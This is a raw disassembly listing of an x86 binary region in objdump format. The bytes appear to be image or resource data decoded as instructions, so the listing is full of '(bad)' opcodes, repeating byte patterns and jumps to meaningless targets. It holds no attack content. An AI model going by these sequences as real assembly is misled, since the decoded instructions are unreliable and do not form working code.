  405b05:	00 00                	add    %al,(%eax)
  405b07:	00 1e                	add    %bl,(%esi)
	...
  405b29:	04 e4                	add    $0xe4,%al
  405b2b:	e6 1e                	out    %al,$0x1e
  405b2d:	19 9d d3 eb 64 bf    	sbb    %ebx,-0x409b142d(%ebp)
  405b33:	e4 ff                	in     $0xff,%al
  405b35:	ac                   	lods   %ds:(%esi),%al
  405b36:	ef                   	out    %eax,(%dx)
  405b37:	fe                   	(bad)
  405b38:	fd                   	std
  405b39:	85 ea                	test   %ebp,%edx
  405b3b:	fe                   	(bad)
  405b3c:	ff 89 ea fe ff 89    	decl   -0x76000116(%ecx)
  405b42:	eb ff                	jmp    0x405b43
  405b44:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  405b4a:	eb ff                	jmp    0x405b4b
  405b4c:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  405b52:	eb ff                	jmp    0x405b53
  405b54:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  405b5a:	eb ff                	jmp    0x405b5b
  405b5c:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  405b62:	eb ff                	jmp    0x405b63
  405b64:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  405b6a:	eb ff                	jmp    0x405b6b
  405b6c:	ff 89 eb ff ff 88    	decl   -0x77000015(%ecx)
  405b72:	ea fe ff 88 eb fe fe 	ljmp   $0xfefe,$0xeb88fffe
  405b79:	8b e9                	mov    %ecx,%ebp
  405b7b:	fe                   	(bad)
  405b7c:	fc                   	cld
  405b7d:	4a                   	dec    %edx
  405b7e:	bd f2 ff 04 50       	mov    $0x5004fff2,%ebp
  405b83:	69 c6 00 00 00 32    	imul   $0x32000000,%esi,%eax
	...
  405ba1:	00 81 b4 01 00 00    	add    %al,0x1b4(%ecx)
  405ba7:	00 00                	add    %al,(%eax)
  405ba9:	01 4e 95             	add    %ecx,-0x6b(%esi)
  405bac:	21 26                	and    %esp,(%esi)
  405bae:	a3 d7 ec 51 b6       	mov    %eax,0xb651ecd7
  405bb3:	e0 ff                	loopne 0x405bb4
  405bb5:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405bb6:	ee                   	out    %al,(%dx)
  405bb7:	fd                   	std
  405bb8:	fd                   	std
  405bb9:	8b f0                	mov    %eax,%esi
  405bbb:	ff                   	(bad)
  405bbc:	ff 8e ef fe ff 8e    	decl   -0x71000111(%esi)
  405bc2:	f0 ff                	lock (bad)
  405bc4:	ff 8e f0 ff ff 8e    	decl   -0x71000010(%esi)
  405bca:	f0 ff                	lock (bad)
  405bcc:	ff 8e f0 ff ff 8e    	decl   -0x71000010(%esi)
  405bd2:	f0 ff                	lock (bad)
  405bd4:	ff 8e f0 ff ff 8e    	decl   -0x71000010(%esi)
  405bda:	f0 ff                	lock (bad)
  405bdc:	ff 8e f0 ff ff 8e    	decl   -0x71000010(%esi)
  405be2:	f0 ff                	lock (bad)
  405be4:	ff 8e f0 ff ff 8e    	decl   -0x71000010(%esi)
  405bea:	f0 ff                	lock (bad)
  405bec:	ff 8e f0 ff ff 8d    	decl   -0x72000010(%esi)
  405bf2:	ef                   	out    %eax,(%dx)
  405bf3:	ff                   	(bad)
  405bf4:	ff 8d f0 fe ff 8c    	decl   -0x73000110(%ebp)
  405bfa:	ec                   	in     (%dx),%al
  405bfb:	ff                   	(bad)
  405bfc:	fd                   	std
  405bfd:	5b                   	pop    %ebx
  405bfe:	c8 f8 ff 10          	enter  $0xfff8,$0x10
  405c02:	66 83 d7 00          	adc    $0x0,%di
  405c06:	00 00                	add    %al,(%eax)
  405c08:	42                   	inc    %edx
	...
  405c29:	00 73 a0             	add    %dh,-0x60(%ebx)
  405c2c:	23 4b b3             	and    -0x4d(%ebx),%ecx
  405c2f:	e1 ed                	loope  0x405c1e
  405c31:	65 bf e6 ff ac ef    	gs mov $0xefacffe6,%edi
  405c37:	fc                   	cld
  405c38:	fc                   	cld
  405c39:	91                   	xchg   %eax,%ecx
  405c3a:	f5                   	cmc
  405c3b:	fe                   	(bad)
  405c3c:	ff 92 f3 fe ff 92    	call   *-0x6d00010d(%edx)
  405c42:	f4                   	hlt
  405c43:	ff                   	(bad)
  405c44:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  405c4a:	f4                   	hlt
  405c4b:	ff                   	(bad)
  405c4c:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  405c52:	f4                   	hlt
  405c53:	ff                   	(bad)
  405c54:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  405c5a:	f4                   	hlt
  405c5b:	ff                   	(bad)
  405c5c:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  405c62:	f4                   	hlt
  405c63:	ff                   	(bad)
  405c64:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  405c6a:	f4                   	hlt
  405c6b:	ff                   	(bad)
  405c6c:	ff 92 f4 ff ff 91    	call   *-0x6e00000c(%edx)
  405c72:	f3 ff                	repz (bad)
  405c74:	ff 94 f5 fd ff 8c ee 	call   *-0x11730003(%ebp,%esi,8)
  405c7b:	fe                   	(bad)
  405c7c:	fc                   	cld
  405c7d:	71 d3                	jno    0x405c52
  405c7f:	fe                   	(bad)
  405c80:	ff 1f                	lcall  *(%edi)
  405c82:	7c 9a                	jl     0x405c1e
  405c84:	e5 00                	in     $0x0,%eax
  405c86:	00 00                	add    %al,(%eax)
  405c88:	52                   	push   %edx
	...
  405ca1:	00 85 ba 01 00 00    	add    %al,0x1ba(%ebp)
  405ca7:	00 00                	add    %al,(%eax)
  405ca9:	00 7e b5             	add    %bh,-0x4b(%esi)
  405cac:	3e 4c                	ds dec %esp
  405cae:	b3 e1                	mov    $0xe1,%bl
  405cb0:	f8                   	clc
  405cb1:	57                   	push   %edi
  405cb2:	b6 e2                	mov    $0xe2,%dh
  405cb4:	fe                   	(bad)
  405cb5:	b2 ef                	mov    $0xef,%dl
  405cb7:	fa                   	cli
  405cb8:	fd                   	std
  405cb9:	97                   	xchg   %eax,%edi
  405cba:	fb                   	sti
  405cbb:	ff                   	(bad)
  405cbc:	ff 96 f9 fe ff 96    	call   *-0x69000107(%esi)
  405cc2:	fa                   	cli
  405cc3:	ff                   	(bad)
  405cc4:	ff 96 fa ff ff 96    	call   *-0x69000006(%esi)
  405cca:	fa                   	cli
  405ccb:	ff                   	(bad)
  405ccc:	ff 96 fa ff ff 96    	call   *-0x69000006(%esi)
  405cd2:	fa                   	cli
  405cd3:	ff                   	(bad)
  405cd4:	ff 96 fa ff ff 96    	call   *-0x69000006(%esi)
  405cda:	fa                   	cli
  405cdb:	ff                   	(bad)
  405cdc:	ff 96 fa ff ff 96    	call   *-0x69000006(%esi)
  405ce2:	fa                   	cli
  405ce3:	ff                   	(bad)
  405ce4:	ff 96 fa ff ff 96    	call   *-0x69000006(%esi)
  405cea:	fa                   	cli
  405ceb:	ff                   	(bad)
  405cec:	ff 96 fa ff ff 95    	call   *-0x6a000006(%esi)
  405cf2:	f8                   	clc
  405cf3:	ff                   	(bad)
  405cf4:	ff 99 fb fe ff 8b    	lcall  *-0x74000105(%ecx)
  405cfa:	ef                   	out    %eax,(%dx)
  405cfb:	fd                   	std
  405cfc:	fd                   	std
  405cfd:	85 dd                	test   %ebx,%ebp
  405cff:	ff                   	(bad)
  405d00:	fe                   	(bad)
  405d01:	2a 90 b0 f3 00 00    	sub    0xf3b0(%eax),%dl
  405d07:	00 62 00             	add    %ah,0x0(%edx)
	...
  405d22:	88 be 02 00 00 00    	mov    %bh,0x2(%esi)
  405d28:	00 00                	add    %al,(%eax)
  405d2a:	7f b7                	jg     0x405ce3
  405d2c:	47                   	inc    %edi
  405d2d:	60                   	pusha
  405d2e:	bd e5 fb 53 b5       	mov    $0xb553fbe5,%ebp
  405d33:	e1 ff                	loope  0x405d34
  405d35:	ab                   	stos   %eax,%es:(%edi)
  405d36:	eb f8                	jmp    0x405d30
  405d38:	fe                   	(bad)
  405d39:	9d                   	popf
  405d3a:	fc                   	cld
  405d3b:	ff                   	(bad)
  405d3c:	ff 9a fb fe ff 9b    	lcall  *-0x64000105(%edx)
  405d42:	fd                   	std
  405d43:	ff                   	(bad)
  405d44:	ff 9b fc ff ff 9b    	lcall  *-0x64000004(%ebx)
  405d4a:	fc                   	cld
  405d4b:	ff                   	(bad)
  405d4c:	ff 9b fc ff ff 9b    	lcall  *-0x64000004(%ebx)
  405d52:	fc                   	cld
  405d53:	ff                   	(bad)
  405d54:	ff 9b fc ff ff 9b    	lcall  *-0x64000004(%ebx)
  405d5a:	fc                   	cld
  405d5b:	ff                   	(bad)
  405d5c:	ff 9b fc ff ff 9b    	lcall  *-0x64000004(%ebx)
  405d62:	fc                   	cld
  405d63:	ff                   	(bad)
  405d64:	ff 9b fc ff ff 9b    	lcall  *-0x64000004(%ebx)
  405d6a:	fc                   	cld
  405d6b:	ff                   	(bad)
  405d6c:	ff 9b fc ff ff 9a    	lcall  *-0x65000004(%ebx)
  405d72:	fb                   	sti
  405d73:	ff                   	(bad)
  405d74:	ff 9e fd ff ff 8a    	lcall  *-0x75000003(%esi)
  405d7a:	ef                   	out    %eax,(%dx)
  405d7b:	fd                   	std
  405d7c:	fe                   	(bad)
  405d7d:	99                   	cltd
  405d7e:	e6 fe                	out    %al,$0xfe
  405d80:	ff 37                	push   (%edi)
  405d82:	a1 c3 fb 00 00       	mov    0xfbc3,%eax
  405d87:	03 73 00             	add    0x0(%ebx),%esi
  405d8a:	01 02                	add    %eax,(%edx)
  405d8c:	08 00                	or     %al,(%eax)
	...
  405da2:	84 b9 02 00 00 00    	test   %bh,0x2(%ecx)
  405da8:	00 00                	add    %al,(%eax)
  405daa:	7b b1                	jnp    0x405d5d
  405dac:	48                   	dec    %eax
  405dad:	7f ca                	jg     0x405d79
  405daf:	ec                   	in     (%dx),%al
  405db0:	fb                   	sti
  405db1:	5b                   	pop    %ebx
  405db2:	bb e5 fe c2 ef       	mov    $0xefc2fee5,%ebx
  405db7:	f9                   	stc
  405db8:	fd                   	std
  405db9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405dba:	fa                   	cli
  405dbb:	fe                   	(bad)
  405dbc:	ff a1 fa fd ff a4    	jmp    *-0x5b000206(%ecx)
  405dc2:	fb                   	sti
  405dc3:	fe                   	(bad)
  405dc4:	ff a6 fb fe ff a8    	jmp    *-0x57000105(%esi)
  405dca:	fb                   	sti
  405dcb:	fe                   	(bad)
  405dcc:	ff a9 fb fe ff a9    	ljmp   *-0x56000105(%ecx)
  405dd2:	fb                   	sti
  405dd3:	fe                   	(bad)
  405dd4:	ff a9 fc ff ff a9    	ljmp   *-0x56000004(%ecx)
  405dda:	fb                   	sti
  405ddb:	fe                   	(bad)
  405ddc:	ff a9 fb ff ff a9    	ljmp   *-0x56000005(%ecx)
  405de2:	fb                   	sti
  405de3:	ff                   	(bad)
  405de4:	ff a9 fb ff ff a9    	ljmp   *-0x56000005(%ecx)
  405dea:	fb                   	sti
  405deb:	ff                   	(bad)
  405dec:	ff a9 fb ff ff a8    	ljmp   *-0x57000005(%ecx)
  405df2:	fa                   	cli
  405df3:	ff                   	(bad)
  405df4:	ff ad fb ff ff 96    	ljmp   *-0x69000005(%ebp)
  405dfa:	f1                   	int1
  405dfb:	fd                   	std
  405dfc:	fd                   	std
  405dfd:	9e                   	sahf
  405dfe:	e6 ff                	out    %al,$0xff
  405e00:	fe                   	(bad)
  405e01:	54                   	push   %esp
  405e02:	b3 d0                	mov    $0xd0,%bl
  405e04:	fe 00                	incb   (%eax)
  405e06:	14 26                	adc    $0x26,%al
  405e08:	8e 00                	mov    (%eax),%es
  405e0a:	00 00                	add    %al,(%eax)
  405e0c:	12 00                	adc    (%eax),%al
	...
  405e22:	8b c1                	mov    %ecx,%eax
  405e24:	02 00                	add    (%eax),%al
  405e26:	00 00                	add    %al,(%eax)
  405e28:	00 00                	add    %al,(%eax)
  405e2a:	82 ba 63 88 cf ee fe 	cmpb   $0xfe,-0x1130779d(%edx)
  405e31:	41                   	inc    %ecx
  405e32:	b1 df                	mov    $0xdf,%cl
  405e34:	fd                   	std
  405e35:	9e                   	sahf
  405e36:	d6                   	salc
  405e37:	ed                   	in     (%dx),%eax
  405e38:	fe                   	(bad)
  405e39:	e5 fe                	in     $0xfe,%eax
  405e3b:	ff                   	(bad)
  405e3c:	ff d3                	call   *%ebx
  405e3e:	fe                   	(bad)
  405e3f:	ff                   	(bad)
  405e40:	ff ce                	dec    %esi
  405e42:	fd                   	std
  405e43:	ff                   	(bad)
  405e44:	ff c7                	inc    %edi
  405e46:	fd                   	std
  405e47:	ff                   	(bad)
  405e48:	ff c1                	inc    %ecx
  405e4a:	fd                   	std
  405e4b:	ff                   	(bad)
  405e4c:	ff b6 fd ff ff b4    	push   -0x4b000003(%esi)
  405e52:	fc                   	cld
  405e53:	fe                   	(bad)
  405e54:	ff                   	(bad)
  405e55:	b8 fc ff ff b7       	mov    $0xb7fffffc,%eax
  405e5a:	fd                   	std
  405e5b:	ff                   	(bad)
  405e5c:	ff b7 fe ff ff b7    	push   -0x48000002(%edi)
  405e62:	fc                   	cld
  405e63:	ff                   	(bad)
  405e64:	ff b7 fc ff ff b7    	push   -0x48000004(%edi)
  405e6a:	fc                   	cld
  405e6b:	ff                   	(bad)
  405e6c:	ff b7 fc ff ff b6    	push   -0x49000004(%edi)
  405e72:	fb                   	sti
  405e73:	ff                   	(bad)
  405e74:	ff                   	(bad)
  405e75:	bb fe ff ff a3       	mov    $0xa3fffffe,%ebx
  405e7a:	f1                   	int1
  405e7b:	fd                   	std
  405e7c:	fe                   	(bad)
  405e7d:	a1 e4 ff fe 76       	mov    0x76feffe4,%eax
  405e82:	c6                   	(bad)
  405e83:	dd ff                	(bad)
  405e85:	00 30                	add    %dh,(%eax)
  405e87:	49                   	dec    %ecx
  405e88:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405e89:	0e                   	push   %cs
  405e8a:	00 00                	add    %al,(%eax)
  405e8c:	1c 00                	sbb    $0x0,%al
	...
  405ea2:	8c c4                	mov    %es,%esp
  405ea4:	03 00                	add    (%eax),%eax
  405ea6:	00 00                	add    %al,(%eax)
  405ea8:	00 00                	add    %al,(%eax)
  405eaa:	84 be 6a 92 d4 f0    	test   %bh,-0xf2b6d96(%esi)
  405eb0:	ff                   	(bad)
  405eb1:	7d db                	jge    0x405e8e
  405eb3:	f6 fd                	idiv   %ch
  405eb5:	31 ae db fe 51 b3    	xor    %ebp,-0x4cae0125(%esi)
  405ebb:	dd ff                	(bad)
  405ebd:	76 c3                	jbe    0x405e82
  405ebf:	e4 ff                	in     $0xff,%al
  405ec1:	8f                   	(bad)
  405ec2:	cf                   	iret
  405ec3:	e9 ff af de f1       	jmp    0xf21f0ec7
  405ec8:	ff ca                	dec    %edx
  405eca:	eb f7                	jmp    0x405ec3
  405ecc:	ff                   	lcall  (bad)
  405ecd:	de f7                	fdivp  %st,%st(7)
  405ecf:	fd                   	std
  405ed0:	ff d3                	call   *%ebx
  405ed2:	fe                   	(bad)
  405ed3:	ff                   	(bad)
  405ed4:	ff                   	(bad)
  405ed5:	be fc fe ff c3       	mov    $0xc3fffefc,%esi
  405eda:	fc                   	cld
  405edb:	fe                   	(bad)
  405edc:	ff c3                	inc    %ebx
  405ede:	fc                   	cld
  405edf:	ff                   	(bad)
  405ee0:	ff c3                	inc    %ebx
  405ee2:	fc                   	cld
  405ee3:	fe                   	(bad)
  405ee4:	ff c3                	inc    %ebx
  405ee6:	fc                   	cld
  405ee7:	ff                   	(bad)
  405ee8:	ff c3                	inc    %ebx
  405eea:	fc                   	cld
  405eeb:	fe                   	(bad)
  405eec:	ff c3                	inc    %ebx
  405eee:	fc                   	cld
  405eef:	ff                   	(bad)
  405ef0:	ff c2                	inc    %edx
  405ef2:	fc                   	cld
  405ef3:	ff                   	(bad)
  405ef4:	ff c8                	dec    %eax
  405ef6:	fd                   	std
  405ef7:	ff                   	(bad)
  405ef8:	ff ae f0 fe fe a3    	ljmp   *-0x5c010110(%esi)
  405efe:	e3 fe                	jecxz  0x405efe
  405f00:	fd                   	std
  405f01:	94                   	xchg   %eax,%esp
  405f02:	d7                   	xlat   %ds:(%ebx)
  405f03:	e9 fe 00 3e 5d       	jmp    0x5d7e6006
  405f08:	bb 0c 00 00 25       	mov    $0x2500000c,%ebx
  405f0d:	00 00                	add    %al,(%eax)
  405f0f:	00 00                	add    %al,(%eax)
  405f11:	02 02                	add    (%edx),%al
  405f13:	03 01                	add    (%ecx),%eax
	...
  405f21:	00 8a c1 02 00 00    	add    %cl,0x2c1(%edx)
  405f27:	00 00                	add    %al,(%eax)
  405f29:	00 83 bd 66 a8 de    	add    %al,-0x21579943(%ebx)
  405f2f:	f4                   	hlt
  405f30:	ff 9f f7 ff fc 89    	lcall  *-0x76030009(%edi)
  405f36:	ef                   	out    %eax,(%dx)
  405f37:	fe                   	(bad)
  405f38:	fd                   	std
  405f39:	76 e4                	jbe    0x405f1f
  405f3b:	f8                   	clc
  405f3c:	ff 68 da             	ljmp   *-0x26(%eax)
  405f3f:	f2 ff 51 c9          	bnd call *-0x37(%ecx)
  405f43:	e9 ff 43 be e3       	jmp    0xe3fea347
  405f48:	ff 37                	push   (%edi)
  405f4a:	b4 dd                	mov    $0xdd,%ah
  405f4c:	ff 51 b7             	call   *-0x49(%ecx)
  405f4f:	de ff                	fdivrp %st,%st(7)
  405f51:	c8 e8 f5 ff          	enter  $0xf5e8,$0xff
  405f55:	e6 fe                	out    %al,$0xfe
  405f57:	ff                   	(bad)
  405f58:	ff cf                	dec    %edi
  405f5a:	fe                   	(bad)
  405f5b:	ff                   	(bad)
  405f5c:	ff d0                	call   *%eax
  405f5e:	fc                   	cld
  405f5f:	fe                   	(bad)
  405f60:	ff cd                	dec    %ebp
  405f62:	fb                   	sti
  405f63:	fe                   	(bad)
  405f64:	ff cc                	dec    %esp
  405f66:	fb                   	sti
  405f67:	fe                   	(bad)
  405f68:	ff cd                	dec    %ebp
  405f6a:	fb                   	sti
  405f6b:	fe                   	(bad)
  405f6c:	ff cf                	dec    %edi
  405f6e:	fc                   	cld
  405f6f:	fe                   	(bad)
  405f70:	ff cf                	dec    %edi
  405f72:	fb                   	sti
  405f73:	fe                   	(bad)
  405f74:	ff d6                	call   *%esi
  405f76:	fd                   	std
  405f77:	fe                   	(bad)
  405f78:	ff                   	(bad)
  405f79:	bb f2 fe fd a7       	mov    $0xa7fdfef2,%ebx
  405f7e:	e1 ff                	loope  0x405f7f
  405f80:	fc                   	cld
  405f81:	b5 e9                	mov    $0xe9,%ch
  405f83:	f5                   	cmc
  405f84:	ff 00                	incl   (%eax)
  405f86:	4e                   	dec    %esi
  405f87:	72 cd                	jb     0x405f56
  405f89:	0a 00                	or     (%eax),%al
  405f8b:	00 2f                	add    %ch,(%edi)
  405f8d:	00 00                	add    %al,(%eax)
  405f8f:	00 00                	add    %al,(%eax)
  405f91:	03 00                	add    (%eax),%eax
  405f93:	00 01                	add    %al,(%ecx)
	...
  405fa1:	00 90 c9 02 00 00    	add    %dl,0x2c9(%eax)
  405fa7:	00 00                	add    %al,(%eax)
  405fa9:	00 89 c6 7e a8 df    	add    %cl,-0x2057813a(%ecx)
  405faf:	f3 fe                	repz (bad)
  405fb1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405fb2:	fa                   	cli
  405fb3:	fe                   	(bad)
  405fb4:	fa                   	cli
  405fb5:	94                   	xchg   %eax,%esp
  405fb6:	f8                   	clc
  405fb7:	fe                   	(bad)
  405fb8:	fe                   	(bad)
  405fb9:	9b                   	fwait
  405fba:	fb                   	sti
  405fbb:	ff                   	(bad)
  405fbc:	ff 9d fc ff ff 9f    	lcall  *-0x60000004(%ebp)
  405fc2:	fc                   	cld
  405fc3:	ff                   	(bad)
  405fc4:	ff a0 fc ff ff a0    	jmp    *-0x5f000004(%eax)
  405fca:	fc                   	cld
  405fcb:	ff                   	(bad)
  405fcc:	ff 69 de             	ljmp   *-0x22(%ecx)
  405fcf:	f0 ff 31             	lock push (%ecx)
  405fd2:	a8 d6                	test   $0xd6,%al
  405fd4:	ff cf                	dec    %edi
  405fd6:	e7 f4                	out    %eax,$0xf4
  405fd8:	ff e5                	jmp    *%ebp
  405fda:	f8                   	clc
  405fdb:	fc                   	cld
  405fdc:	ff                   	ljmp   (bad)
  405fdd:	ea fc fe ff f5 ff ff 	ljmp   $0xffff,$0xf5fffefc
  405fe4:	ff f7                	push   %edi
  405fe6:	ff                   	(bad)
  405fe7:	ff                   	(bad)
  405fe8:	ff                   	ljmp   (bad)
  405fe9:	ef                   	out    %eax,(%dx)
  405fea:	fe                   	(bad)
  405feb:	ff                   	(bad)
  405fec:	ff                   	ljmp   (bad)
  405fed:	e8 fe ff ff e1       	call   0xe2405ff0
  405ff2:	fe                   	(bad)
  405ff3:	ff                   	(bad)
  405ff4:	ff e2                	jmp    *%edx
  405ff6:	fd                   	std
  405ff7:	fe                   	(bad)
  405ff8:	fe c0                	inc    %al
  405ffa:	f0 fd                	lock std
  405ffc:	fe                   	(bad)
  405ffd:	a2 de fe fc d8       	mov    %al,0xd8fcfede
  406002:	fa                   	cli
  406003:	fe                   	(bad)
  406004:	fe 00                	incb   (%eax)
  406006:	5c                   	pop    %esp
  406007:	84 da                	test   %bl,%dl
  406009:	05 00 00 42 00       	add    $0x420000,%eax
	...
  406022:	92                   	xchg   %eax,%edx
  406023:	cc                   	int3
  406024:	01 00                	add    %eax,(%eax)
  406026:	00 00                	add    %al,(%eax)
  406028:	00 01                	add    %al,(%ecx)
  40602a:	8d                   	lea    (bad),%ecx
  40602b:	ca 8f b1             	lret   $0xb18f
  40602e:	e3 f4                	jecxz  0x406024
  406030:	fe                   	(bad)
  406031:	ab                   	stos   %eax,%es:(%edi)
  406032:	fb                   	sti
  406033:	fe                   	(bad)
  406034:	f9                   	stc
  406035:	95                   	xchg   %eax,%ebp
  406036:	fc                   	cld
  406037:	fe                   	(bad)
  406038:	ff 99 fb fe ff 98    	lcall  *-0x67000105(%ecx)
  40603e:	fb                   	sti
  40603f:	fe                   	(bad)
  406040:	ff 97 fb fe ff 96    	call   *-0x69000105(%edi)
  406046:	fa                   	cli
  406047:	fe                   	(bad)
  406048:	fe                   	(bad)
  406049:	96                   	xchg   %eax,%esi
  40604a:	f9                   	stc
  40604b:	fd                   	std
  40604c:	fe                   	(bad)
  40604d:	a1 fc ff ff 6b       	mov    0x6bfffffc,%eax
  406052:	df f0                	fcomip %st(0),%st
  406054:	fd                   	std
  406055:	36 b6 dd             	ss mov $0xdd,%dh
  406058:	fb                   	sti
  406059:	5a                   	pop    %edx
  40605a:	c0 e2 fc             	shl    $0xfc,%dl
  40605d:	66 c2 e3 fd          	retw   $0xfde3
  406061:	73 c3                	jae    0x406026
  406063:	e3 fe                	jecxz  0x406063
  406065:	8d                   	lea    (bad),%ecx
  406066:	cd e7                	int    $0xe7
  406068:	fe                   	(bad)
  406069:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40606a:	d8 ec                	fsubr  %st(4),%st
  40606c:	ff c6                	inc    %esi
  40606e:	e7 f4                	out    %eax,$0xf4
  406070:	ff e0                	jmp    *%eax
  406072:	f2 f9                	repnz stc
  406074:	ff                   	(bad)
  406075:	ff                   	(bad)
  406076:	ff                   	(bad)
  406077:	ff                   	(bad)
  406078:	ff                   	ljmp   (bad)
  406079:	eb f9                	jmp    0x406074
  40607b:	ff                   	(bad)
  40607c:	ff cf                	dec    %edi
  40607e:	ee                   	out    %al,(%dx)
  40607f:	ff                   	(bad)
  406080:	fc                   	cld
  406081:	f5                   	cmc
  406082:	ff                   	(bad)
  406083:	ff                   	(bad)
  406084:	fc                   	cld
  406085:	11 75 9d             	adc    %esi,-0x63(%ebp)
  406088:	e9 00 00 00 58       	jmp    0x5840608d
  40608d:	1d 01 00 01 00       	sbb    $0x10001,%eax
	...
  4060aa:	7e be                	jle    0x40606a
  4060ac:	59                   	pop    %ecx
  4060ad:	9a d2 ec ff c5 fd ff 	lcall  $0xfffd,$0xc5ffecd2
  4060b4:	fd                   	std
  4060b5:	90                   	nop
  4060b6:	fb                   	sti
  4060b7:	fe                   	(bad)
  4060b8:	fe                   	(bad)
  4060b9:	9a fa fe fe 99 fb fe 	lcall  $0xfefb,$0x99fefefa
  4060c0:	ff 99 fb fe ff 9a    	lcall  *-0x65000105(%ecx)
  4060c6:	fa                   	cli
  4060c7:	fe                   	(bad)
  4060c8:	ff 92 fa fe ff b7    	call   *-0x48000106(%edx)
  4060ce:	fb                   	sti
  4060cf:	fe                   	(bad)
  4060d0:	fe                   	(bad)
  4060d1:	d9 fc                	frndint
  4060d3:	ff                   	(bad)
  4060d4:	ff b3 ed f8 ff a3    	push   -0x5c000713(%ebx)
  4060da:	e9 f6 ff 95 e8       	jmp    0xe8d660d5
  4060df:	f5                   	cmc
  4060e0:	ff 84 e3 f3 ff 6e d9 	incl   -0x2691000d(%ebx,%eiz,8)
  4060e7:	ed                   	in     (%dx),%eax
  4060e8:	fb                   	sti
  4060e9:	5f                   	pop    %edi
  4060ea:	ce                   	into
  4060eb:	e9 fb 59 c7 e5       	jmp    0xe607baeb
  4060f0:	fb                   	sti
  4060f1:	4e                   	dec    %esi
  4060f2:	bf e1 fc 41 b3       	mov    $0xb341fce1,%edi
  4060f7:	db fc                	(bad)
  4060f9:	5e                   	pop    %esi
  4060fa:	be e0 fd 84 c9       	mov    $0xc984fde0,%esi
  4060ff:	e4 fb                	in     $0xfb,%al
  406101:	97                   	xchg   %eax,%edi
  406102:	d3 e9                	shr    %cl,%ecx
  406104:	ff 1e                	lcall  *(%esi)
  406106:	8b b6 df 00 10 1d    	mov    0x1d1000df(%esi),%esi
  40610c:	36 00 00             	add    %al,%ss:(%eax)
	...
  406127:	00 00                	add    %al,(%eax)
  406129:	78 c8                	js     0x4060f3
  40612b:	e7 02                	out    %eax,$0x2
  40612d:	37                   	aaa
  40612e:	a8 d5                	test   $0xd5,%al
  406130:	cd d6                	int    $0xd6
  406132:	f4                   	hlt
  406133:	fb                   	sti
  406134:	fb                   	sti
  406135:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406136:	fc                   	cld
  406137:	ff                   	(bad)
  406138:	f8                   	clc
  406139:	94                   	xchg   %eax,%esp
  40613a:	fb                   	sti
  40613b:	ff                   	(bad)
  40613c:	fc                   	cld
  40613d:	95                   	xchg   %eax,%ebp
  40613e:	fb                   	sti
  40613f:	ff                   	(bad)
  406140:	fc                   	cld
  406141:	93                   	xchg   %eax,%ebx
  406142:	fa                   	cli
  406143:	fe                   	(bad)
  406144:	fd                   	std
  406145:	8b f8                	mov    %eax,%edi
  406147:	fd                   	std
  406148:	fe                   	(bad)
  406149:	ad                   	lods   %ds:(%esi),%eax
  40614a:	fb                   	sti
  40614b:	fe                   	(bad)
  40614c:	fd                   	std
  40614d:	d3 f1                	shl    %cl,%ecx
  40614f:	fc                   	cld
  406150:	ff 42 9b             	incl   -0x65(%edx)
  406153:	c1 db 53             	rcr    $0x53,%ebx
  406156:	b6 de                	mov    $0xde,%dh
  406158:	ae                   	scas   %es:(%edi),%al
  406159:	74 c0                	je     0x40611b
  40615b:	e1 c5                	loope  0x406122
  40615d:	86 c9                	xchg   %cl,%cl
  40615f:	e4 df                	in     $0xdf,%al
  406161:	99                   	cltd
  406162:	d3 ea                	shr    %cl,%edx
  406164:	fb                   	sti
  406165:	9d                   	popf
  406166:	d8 ee                	fsubr  %st(6),%st
  406168:	ff a3 e0 f2 ff a8    	jmp    *-0x57000d20(%ebx)
  40616e:	e7 f5                	out    %eax,$0xf5
  406170:	ff af f0 f9 ff bb    	ljmp   *-0x44000610(%edi)
  406176:	f9                   	stc
  406177:	fc                   	cld
  406178:	ff 89 e4 f8 ff 00    	decl   0xfff8e4(%ecx)
  40617e:	73 a3                	jae    0x406123
  406180:	de 00                	fiadds (%eax)
  406182:	6b a1 81 00 7c b1 40 	imul   $0x40,-0x4e83ff7f(%ecx),%esp
	...
  4061ad:	00 81 c1 54 79 c4    	add    %al,-0x3b86ab3f(%ecx)
  4061b3:	e3 ff                	jecxz  0x4061b4
  4061b5:	d1 f1                	shl    $1,%ecx
  4061b7:	f9                   	stc
  4061b8:	ff c7                	inc    %edi
  4061ba:	f4                   	hlt
  4061bb:	fb                   	sti
  4061bc:	ff ca                	dec    %edx
  4061be:	fa                   	cli
  4061bf:	fd                   	std
  4061c0:	ff c8                	dec    %eax
  4061c2:	fd                   	std
  4061c3:	ff                   	(bad)
  4061c4:	ff c9                	dec    %ecx
  4061c6:	fd                   	std
  4061c7:	ff                   	(bad)
  4061c8:	fc                   	cld
  4061c9:	ed                   	in     (%dx),%eax
  4061ca:	fe                   	(bad)
  4061cb:	ff                   	(bad)
  4061cc:	fc                   	cld
  4061cd:	52                   	push   %edx
  4061ce:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4061cf:	c8 f4 00 00          	enter  $0xf4,$0x0
  4061d3:	00 4a 00             	add    %cl,0x0(%edx)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	00 00                	add    %al,(%eax)
  4061da:	8b c7                	mov    %edi,%eax
  4061dc:	0a 00                	or     (%eax),%al
  4061de:	3b 92 1b 00 5f ab    	cmp    -0x54a0ffe5(%edx),%edx
  4061e4:	2c 00                	sub    $0x0,%al
  4061e6:	7d bf                	jge    0x4061a7
  4061e8:	3f                   	aas
  4061e9:	1c 96                	sbb    $0x96,%al
  4061eb:	ca 62 35             	lret   $0x3562
  4061ee:	9f                   	lahf
  4061ef:	cd 84                	int    $0x84
  4061f1:	46                   	inc    %esi
